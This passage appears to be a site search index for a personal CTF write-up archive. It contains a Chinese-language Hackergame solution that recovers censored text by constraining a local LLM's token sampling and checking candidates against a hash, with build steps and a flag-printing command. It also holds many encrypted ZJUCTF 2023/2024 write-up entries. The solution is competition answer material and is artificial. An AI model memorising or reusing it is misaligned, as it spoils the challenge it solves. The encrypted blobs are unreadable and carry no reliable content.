sampler\u3002\u6211\u4eec\u5176\u5b9e\u4e0d\u9700\u8981\u5173\u5fc3\u5177\u4f53\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u628a\u4ed6\u4eec\u7406\u89e3\u6210\u4e00\u4e2a\u66f4\u6539\u5404\u4e2a token \u51fa\u73b0\u7684\u6982\u7387\u7684\u5411\u91cf\u51fd\u6570\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u539f\u6837\u63a8\u7406\u4e00\u6b21\uff0c\u628a\u4e0d\u7b26\u5408\u8bed\u6cd5\u7684 token\uff08\u6bd4\u5982\u5f53\u524d\u4f4d\u7f6e\u4e4b\u540e\u7684\u5b57\u7b26\u662f xxxxxp...\uff0c\u90a3\u4e48 hello \u80af\u5b9a\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a l \u4e0d\u4f1a\u53d8\u6210 x\uff0c\u800c hack \u5219\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a\u524d\u56db\u4e2a\u5b57\u6bcd\u90fd\u662f x\uff09\u7684\u51fa\u73b0\u6982\u7387\u8bbe\u6210 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u7684 token\u3002\u5982\u6b64\u8fd9\u822c\uff0c\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684 token \u90fd\u662f\u4e00\u4e2a\u9009\u62e9\u7684\u5206\u652f\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u4e00\u4e2a\u641c\u7d22\u6811\uff08\u7c7b\u4f3c\u4e8e\u8ff7\u5bab\uff09\uff0c\u8fd9\u4e2a\u6811\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u80fd\u8fbe\u5230 EOG\uff08\u8fd9\u91cc\u662f <|im_end|>\uff09\u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e00\u95ee\uff09\uff0c\u4e5f\u53ef\u80fd\u6709\u5f88\u591a\u8fbe\u5230 EOG \u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e8c\u95ee\uff09\uff0c\u800c\u6b63\u786e\u6ee1\u8db3 hash \u7684\u7b54\u6848\u5c31\u5728\u67d0\u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u3002 \u89e3\u9898\u601d\u8def \u89e3\u9898\u4ee3\u7801\u662f\u57fa\u4e8e llama.cpp \u6539\u7684\uff0cdiff \u88ab\u5bfc\u51fa\u6210\u4e86 exp.patch \u6587\u4ef6\uff0c\u9009\u624b\u60f3\u81ea\u5df1\u8fd0\u884c\u7684\u8bdd\u65b9\u6cd5\u5927\u81f4\u5982\u4e0b\uff1a clone https://github.com/ggerganov/llama.cpp/ checkout c421ac072d46172ab18924e1e8be53680b54ed3b apply exp.patch modify examples/simple/simple.cpp L23 for censored chars modify examples/simple/simple.cpp L178 for prompt modify examples/simple/simple.cpp L202 for number of threads make (optional with GGML_CUDA=1) copy after.txt & before.sha256 to current dir ./llama-simple -m /path/to/qwen2.5-3b-instruct-q8_0.gguf echo \"flag{llm_lm_lm_koshitantan_$(sha512sum output.txt | cut -d ' ' -f1 | cut -c1-16)}\"","title":"\u5148\u4e0d\u8bf4\u5173\u4e8e\u6211\u4ece\u96f6\u5f00\u59cb\u72ec\u81ea\u5728\u5f02\u4e16\u754c\u8f6c\u751f\u6210\u67d0\u5927\u5382\u5bb6\u7684 LLM \u9f99\u732b\u5973\u4ec6\u8fd9\u4ef6\u4e8b\u53ef\u4e0d\u53ef\u80fd\u8fd9\u4e48\u79bb\u8c31\uff0c\u53d1\u73b0 Hackergame \u5185\u5bb9\u5ba1\u67e5\u59d4\u5458\u4f1a\u5fd8\u8bb0\u5ba1\u67e5\u9898\u76ee\u6807\u9898\u4e86\u3054\u3081\u3093\u306d\uff0c\u4ee5\u53ca\u300c\u8fd9\u4e48\u957f\u90fd\u5feb\u8d76\u4e0a\u8f7b\u5c0f\u8bf4\u4e86\u771f\u7684\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u5417\ud83e\udd23\u300d"},{"location":"ctf/writeups/zjuctf2023/","text":"ZlbY4r+arUoQ45aX8V18og==;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;^","title":"\ud83d\udd12 ZJUCTF 2023"},{"location":"ctf/writeups/zjuctf2023/#zjuctf-2023-writeup","text":"cDOk3bywHAvCtsYsawEYtg==;xkbkODpPe/6riOtIVuMRIL4+ottRnapCnyENVRwGk4gbK9d09xr1c0JMcliAd5RLw6iDnwWvCEt/XvWPQT6NfT4WWsjsOm3arsx6zc1FnAavcOkk4jbiTMUBjVovrDx/aO2K1RtjMXpmT6IU/7RAlOXTAP9iOTkeGh+xdH6vL7aVVAqxuR/l/FlOo5sH5dt/Rg8LOp6whFMzIXaXFz6cPWWR1Jq0eEs7SE2yPP4zybIIxcd8UoHqTrLQDE6MAPOGb7SpdlbdYb2Bw5pW3BiWM5mkASpjJTbHmdo0Db3ng14okeALDLeNps/Xi/0lhu1a4TRTnRUhdmZkian9PBNuw9DEU5ehAvcNIvY9oL+ULUljBKKyVvDvHMfpBYMj/bE/HRuFqr07p0Rxorq4zYElEKFZxBfr3OlXJTuXAqjH5Di4yXsKsriQVb+oXCe6KxkTwVkeOOcjPMjwKqyTuL0SnoNSWcOwVM/8S190TO3c0k2C08YQU+rVc4bRc31HF6qWTWFQvWab3gM146uBhD+XbLg8LlbIisbFCyAureB5pV95d2H1Je9rl/k5uafpdVUBQLFIHJgXfdt3s6TNKHby0k3OmkRJtEwQRCEZegAztV3LanHvPXYIXDqGyFrHR092CdjRM4PJyVFuvs1UtgHiR1OGqAf2Hng74YeNF2hxedvwzN5uQ/w1vBnz1yzoZbEHJgZnI7PnTmO1WJnHLqyOn2l1YDXVX+wQFHC9Z5DsFD/Rl59PpSO5VEfWuRqvoUwhXlDOik965j7Jf3XMeFjQ8bwH9AX8x29pkIwdBkPPjfY9JBF+zRtgANZWrnm02vo6GTOePRookLemddxeMv1LEqiYHs3OENV+8lwd97nz8Vv0JPtZxWIazfZBbgC6SqeHdcTNvMEnwq3l4tMXiaQcscC8jUt4yEPCDcm6rf3cZNoL6QFX7fARw+kaheBRfye0GaCpSMBtlERtngvh816wkEZz0vVkw2bWTZ6NAGEOqR3Mrt5Qs20qxQmfs/HGP9Iyzo+y60MclYjk0JyN0Duo7p/LPnjPbDL2Y/TMqcEtLkzPLXOe08Z2JRMvpU+gv1yGNM+sWAQdhVxYWktKa4odUkZwl6iyOoVFaXxcP3y3xJFvo1avni8poKjrmY42UEZyY52TN/zAeEE+NwXKr+9LwXkLinvJDSkBV9agxWSAPQlN/odUeNxteCmTPSwLTyr2oejK0H2w4UP9nOxcTxtOIjUZPyYZg6r6hi3IIOg8XMh4QRolGi/xlfVrS/a8hS2X;^","title":"ZJUCTF 2023 Writeup"},{"location":"ctf/writeups/zjuctf2023/#_2","text":"ClAIUjKv9yFI71i+k5QWkg==;MoG0v929efaFEY0kNSsUC3KZ1grXChBy/JbCDCrbPz3Y7G1yucyzP+t7eVC7/mud2fFBDzAvJFlDNX8NNo6ah69ylgVVqIuvxxUqIG5pJVJtvh2BbIP7AMadolw0+TUkgE8IYnLsN2p02iNub+eCmPJz7j0p7g+HrcjnXJYe4sk=;^","title":"\u666e\u901a\u7684\u9b54\u6cd5\u53f2"},{"location":"ctf/writeups/zjuctf2023/#23w40a_or_ctf","text":"gMhET0bWI5dgIAuqmEAqew==;eFZIKtEwl+pPRgFsIfvjSD4kOvSQGpcy7UN41tmjyBtzgfalmwqkFuvzdjNFkxML/V+1qAZR1obdXkv4yRR+K89L+MoCJh6UDXcRIHJQ/j0ZMnKJtMPSdY4cn1BWu1Wjyuc6y+Rv5DXp+hjsIxpLF+tvbz6hPNmBbWc5g6xQ+I68pJqDbSmxtANEYD/W6/68X28zHagnNNTE9U2Np8z9NNf0HSJ7Sx96KZK7U7FfnE0WyySNlW7ooKsXOuF4rj2zH1VkSXxrNkROgqkJzxTeY1+53jufEkGT62dTigqjpxjypcC8X4xKPw5LWNSoc/OiWxFZ4qZdZ+3fogWAA2/fgHOa0OLl6D6UlR0iDVQE1YYVqm4XxUt8VX4RP7CmAsYzZ0dE6BIzOU79csMVDTL2dPYpznP+oxkGth6o1KsTxmyhb7vCwXsxj1at8oe8HmzkMJtIrOYHe9ZLZICg8vjKwbIXQzo4fFznqCz0Og1qS0LxqHIbt9RWfSBF6jlSouix+EhJeHTHydD3lXXL5K9NFAflRCkvZuGPu3hNUTOgPfM=;^","title":"23w40a_or_ctf"},{"location":"ctf/writeups/zjuctf2023/#ruru","text":"L4yhbOyWGDVDO1YpQvymIg==;eqA+H0acU5R2T583aGaVsMEBTcVQxO8aGQBnoXTuSQdm0oHuNeoHlbtejJqn4PfQlIUYciZh9BGeU+u+RttF72GwSpjsqwmv146mQTbVDVwNytFlJ8D+WwOJ84wktLegaacaUbtf+vFYYXRVWsZL5/Q3nfz58+P8n1/HWKMQAUocx3J7cNCFrMLDCVZ5ULgDHfQBXXDoxMU3SN7K4E54z0hpQpx4LMnBkIjORotHm1wJoU3Mnp3PKC85HPOIl1dwdV06l7pOzxGiJc9c+nNCRGqbi5Tv0mXPtcCdhhKXJuFpgCFcA0aOzzb8m6u0Fl0d5uxbgmq/ts65mWsuskEQ78RVdDDhaJ+uD4FZGe3wa77O8N+1RgkLdccPJU6Zyt3g0JYKt+ehyilOSYPQRXFsdo+JfThem5XERbBH+xh31eg=;^","title":"RURU"},{"location":"ctf/writeups/zjuctf2023/#genshin-impact-format","text":"LAPGWcfWQBQe2iFdKDig4g==;mPq0ZLWSjQpbisYsF2+0hhHeyiYwlaJMn4mZ6xTkJEgbt5iiJvD/DasNxe5jZ89E1p5nawNJDZ2mVQLoimXNTIqiQhdeBTFFXgIAn1N7Wg3QB94NyyctmVOSydIMozW7ZUs3Wyio71uNNtpelohC+JVanRWMdq+83L94XWPQ2D+2497/XHC4NrXGLnqbQ/VACoe3VWBmoa1Y4lSjZ0jBIg==;^","title":"Genshin Impact Format"},{"location":"ctf/writeups/zjuctf2023/#proof-of-work","text":"Q3cmcj+I6L1TvQTPPzgHtQ==;bm1XcXM+qtYwDo3puDLJraIBEbkvyzhVmUIk1otZJrY=;^","title":"Proof-of-Work"},{"location":"ctf/writeups/zjuctf2023/#quine-relay","text":"KK8S4AWSj7hVINAYEmFMgQ==;/cVYTukPLpXV3lr0qaNiF+I69PbWuXE6OcwCcjkAU0rNGhCdGTU58Hv9vDIi3XRH6k4uwx7fmhyd0b7moqwjGfuPqA3cgLfCmqZQVup8wjmwBVXxlGNOGsKWHVdRMGqJ;^","title":"Quine Relay"},{"location":"ctf/writeups/zjuctf2023/#minesweeper-master","text":"+1F1eXEtue2Wz75hlUpqMw==;4o3HJn6rN8mxhp2SM7EeR0b0axnGd1j1oBbkaZxBYts=;^","title":"Minesweeper Master"},{"location":"ctf/writeups/zjuctf2023/#easy-reverse","text":"WFzWyXOyE4leIVWIzqspwg==;Z/eoJUTwALNrhGFTKvx2oDfLOAUJwiFUl8YSwZKBLr1yce031M7pNWhClEfW38n1GTq/+A1Eufm86fAQEmfsXCSkvLe0LvVRnuQog/vnnZOH685Ji4rzR5m19IiUsukSr5NHl52tibPfUQRNOnP94feh9n7j61HVx4Ee8NqBVTQ=;^","title":"easy reverse"},{"location":"ctf/writeups/zjuctf2023/#hash-predictor-1","text":"nhZWOgWDouEEQLfyDLMD5Q==;XmYzXFCW+DuZnoMXNMIJ7qW2d3o4j7CAHPQCrtqVd3qJd7ppIVBovoRSAuk7dCf1inXylYc/QDrnNOJQevYWPdrr+h0DBrg0v6Xtj+lcopOWbAfIn/UcziAlibf+mQqSsipuz7JWHX9PcHIhg/hhsiyEs33FIDOkkzgmxRguXRyQe2wVjfEsbT6fFXmp8JVrwNKOAlPRlMmGyQk5dp5w86RBUgQzgXEmciiwCaYMr9FGoVg7RaKcH3v1ivg7FVPt;^","title":"hash predictor 1"},{"location":"ctf/writeups/zjuctf2023/#hash-predictor-2","text":"S83nIFr5AqjR+UWs8Atcag==;QBRpFehY+KeyUJjQhow40f1/BvTr/1lG/58v90YTwdcSTEnr1f+coFDv1SI8pH3FiSQwZ2ud2Eg3I0UCfIY2FQAlh+/sr5FbfGIMHulZkbw1zHQ//n8RDDdrZf5oTB2v;^","title":"hash predictor 2"},{"location":"ctf/writeups/zjuctf2023/#welcome","text":"WIjuD0gj7nv5eBwTWSAQCA==;KXY6I8k8rT1/MbkASnEsDQKLQU0r3slh84JmpS/MZIMAO4LhmyEPsWN/mLAOr9oy3qgp2AYivnF6eCVtdlHvbQ==;^","title":"welcome"},{"location":"ctf/writeups/zjuctf2023/#baby-sql","text":"oeoXjdHO7rffpAF+dQZygw==;HQ61i5+5p8TIVL7fjL0TM6HlbYf9omjHKEob0BdhtaFUX4NNQ0UVrsD/dDCoX8aN9OGS7jw3ZOslGcWzgnUivA==;^","title":"baby sql"},{"location":"ctf/writeups/zjuctf2023/#easy-sql","text":"loBdUd5m4TJXej2CYVvlmA==;5lyws/NxipwvA0ATRmiKZ9VvEWPTh++QbypRiZ8xZenBe1zQuS2dx7cpARmiA7WrjB3zsVX1T+aN2nJ5VkPwy+AHOYjw5Ngrc4l+7NkHbr/U/H680+I3ouxB2EtrJkTJ;^","title":"easy sql"},{"location":"ctf/writeups/zjuctf2023/#babyphp","text":"cikOo0Q6ohgLfRU2ZlgJOQ==;PoiLJ6CzhPnx+p1/yjp5gySmP5k8MJe5B1CqSOp1olE=;^","title":"babyphp"},{"location":"ctf/writeups/zjuctf2023/#easy-calc","text":"V4odu587dNMmLHWJWxxbzA==;BGxY5PK2GNc/Ezk5H/tpttIVD/0zp9YLDMaXuolbNdkkSw/yCiedE/8XfSGWA+xeUGQ86byakJxg8pSa3TW3kKtRpR0ajmWHiH1s5T9gU7rTrM7z6hVXXdg+8Rz7r9PQ;^","title":"easy calc"},{"location":"ctf/writeups/zjuctf2023/#babyfor-realjs","text":"JrvEHKJCI3p9DMu1xqIkmQ==;R5OiwKT02vcqi3UIO5BIz4mAqgrNPy7DQ4OQWS5TeX8=;^","title":"Baby\uff08for real\uff09js"},{"location":"ctf/writeups/zjuctf2023/#rev-signin","text":"os3G/8s4b16NieYU87dU4w==;2OwSfZjpMmjzWkdxqvrB5HGx5kuJu7c+4J/aSBlny94uC6C5rP85RZ5k28NlZ80+JWyh0k7HYeiAPToNZQ9Hekks6sR+476sZ0XA1YKL3IO37/gjqrFnwW+vqUgMaTYs;^","title":"rev signin"},{"location":"ctf/writeups/zjuctf2023/#zju-dorm","text":"WkbIDgN+edA0DgAyrkn0Xw==;B0WMRb0afrGbwjNr7XJzjpc0kvMo0bO/K2XXgGKK6cDHINrbRCctJDnLrcBGVoz3wb/ckH8UcFd0KHjgg1EJJYmDpRyavilvt7ew6DEtSU5X2lPHN/2CsF+l1G15bvAJ;^","title":"ZJU dorm"},{"location":"ctf/writeups/zjuctf2023/#if-else","text":"fnZXH7nz76UCSGhNPxhqWQ==;J2uu2kQZTV61drk4DwHKoesENDplAZjWkdFr6eEKSbr31MlGViJVWL+F4g/FedmdwbKxr+zaA0tYRmOAM6o9SAclTKW5Zuj11sOROdcJzsThApkOFwSwPB5hUgAy4enZvaP0cgZ0PF2m6KS4/Zt1IIp/whAPKBTLDkjQ9OmIoX8=;^","title":"IF ELSE"},{"location":"ctf/writeups/zjuctf2023/#500mazes","text":"f1UQRcfDwsPII1DgeVpD/w==;73O89faulkHds04nFJo76xww/wajRp3s4w15E8uFxxvv/nhYmIOT0Je6RBX7SQ+YR3n8jDfH63bNnvnjuxGqSch7vfeOT8syD+O5Jpy95znlBRDheMDfIPhk2I8X/YH7ZOEli+NrLvHXg7BL+TI3MdZKCRlWuBC/y1D5PHMsYVlGVaIAm/sF9s7HYDxVjgJD1VH1SpohbVEMtp7KXtZ1UzIR6llcBBtaqAhw27XMeKVmyJL/J5eusoLzIgVZgpzp;^","title":"500mazes"},{"location":"ctf/writeups/zjuctf2023/#_3","text":"bUHZATHxCa52D7PPvCJLcA==;0m8ClTnzzE8Ujy3B3k5lD+QjOO7Ntut0ilAwXoIMIoRZvspkS3W4m2nFHLk8jxPnNDuh2OR6rMOSwuXjtsiNOFXM4puzwckB6u8LIXjxEdDwzq6ytrslnzT/Wh/DoB80QhRkwHxQ1rWgiG0MwmPEsCCarF3nHbm/wWByLIbKp1fYFVSzuPKkiSqzaAA2JtwHSba2QmuYQ1bteHl7fGVCBg==;^","title":"\u26a1 \u9065 \u9065 \u9886 \u5148 \u26a1"},{"location":"ctf/writeups/zjuctf2024/","text":"RbcxniyT83XSqKTbXx67Ig==;;^","title":"\ud83d\udd12 ZJUCTF 2024"},{"location":"ctf/writeups/zjuctf2024/#zjuctf-2024-writeup","text":"OiOrMY7Wc3m+lINBjxv0/w==;ubiyLyyPyVnayr1bJtVXSeEgeT6Rv4PO8OPO97MSv0936dJ8n7xeJNd0/FD6g4LQLPcplCx6CGH0m51T5AZMuJV8B6laI4ug4MWqK7guqr1txL+EDtvg9s0mlAVpMv/lBpQdO9ptwCu8V7o5u+YZ79iBNr3TMKPXg34i/QaKqHVDki763ZWhXOiU8Z3kjyRIa89D6yunbVghiQPPMs6ATvc4z1PpoUJ5YshiVrdlmh35jZoWwgKGjmOSSSBv8hcY9SgCS8y3urJj0PoDXNaUw6ak1OaS95MUy6V2jcMYilqHzsqiQp319bqKfbKkaBiLpcaakTY9yaTsYVcCH78cadgyC8jTwOz5hfLD73hk0SMnxPXsMLvbZLZqOYtejwjVznLd5PAELqSbg/29LCX/C0kIuXfn33siIlTl5VOJOmLbFhjFYChg6adY4aY/EJlb9faqICR+LfUgTkOiN3Rz7i5N9oTl9Va/lkUVAjq+uFmnXlEioG6u9577uRRt7icUFAZ5PUqcP6Grfq8p+NM4Ox0d+eOPP/tF4CotfN1iEb0XmnfIjDZ9l+kcXeXeVAVvj4q6FckYtWT1HwJjGN4P1w==;^","title":"ZJUCTF 2024 Writeup"},{"location":"ctf/writeups/zjuctf2024/#misc","text":"qTn3RzLad6qs6a9NSbOndg==;ErQQBg5PMWf40Aqo8FdGfV/A9hAvo5ebsBtHlywd1gQ=;^","title":"Misc"},{"location":"ctf/writeups/zjuctf2024/#a","text":"eu9wo2CrGOIFZDP7p4XW5w==;UvDk+P7tQ8k3DoikiOMMSfkPCyAypqZSYyLRHbvbV0vxaPMsKZR+/7NEgzDjzxE6GGkO1yWBQD5PveSl3kI3sBTqnCR82uOXWcDpL+J5tqy7TegnmhWmUBMu+aJAEXdS7u1RMxtLKwtL4HLVx9a6BYqtuX0HbPQksffKsmU4JEKBVaQ/qLu6HTXftqD+InNOPtS9K6Naxjkk0+k2BWEoVJJhSsHssuir27RsWRXiMuRd2P7rmZZ+MAITeDyBdmLf2m+XSz12Q5Hm73r5F7uxKd4cVxnZHv0ls0M9YSeFXNfkFErpHlXjoRtjRkcyC7zT7yx29BwjgkhYA++erdGLleBiYl7DbPEWAfNvPvqc9P2WWVxxS6bX+214eghT3HXkFG+kWpNpKg/04vOHiTKQ44L+zTj4+xmJzHMz9qix0y1gc38yVp9SNCQ4ozGZkcpqFLZYYZM2bt0MQSoxDdipXrnkgIMS5RBoX1AH/d3SIR/D1ZphJ+h9+OXBUcnkpB11DjgCAKWxZrIiqO623CJLq6MkU/B3RzcpnOLFbG85UNmX8xfy6QSbouzFqnLH7laKJS0MQsOEaw6p/YSFfhKKDbg2Int3dbd8yCEeLAT+07OfZJOUMe0Xwk66HwncZ5syJsWgVTHVBrTLEYCiKhKfB6q4zH03cWxO1CezLDR3Z31S2gZPwY121Wphs3BZ9bWMoFYFwOnQ1W52Aiq1yDr5XgtpJS+